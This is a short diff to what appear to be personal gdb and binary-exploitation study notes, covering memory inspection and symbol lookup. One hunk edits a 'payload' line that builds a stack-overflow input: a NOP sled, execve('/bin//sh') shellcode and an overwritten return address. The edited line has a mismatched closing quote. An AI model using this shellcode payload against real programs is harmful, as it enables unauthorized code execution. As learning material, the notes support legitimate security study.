@@ -49,7 +49,7 @@ $9 = 100000
 (gdb) x/1tb &i
 0x7fffffffdff4: 00100000
 
-
+x/4xb &hello
 last5 characters
 (gdb) print hello
 $12 = 0x555555556008 "Hello world!"
@@ -148,7 +148,8 @@ $ readelf -s example4 | grep -i "usage"   # any function
 
 
 # payload
-run $(python -c "print('\x90'*208   + '\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' + '\x3a\xd0\xff\xff' * 10  )")
+run $(python -c "print('\x90'*208   + '\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' + '\x2c\xcf\xff\xff')"`
+
 ```
 
 ```
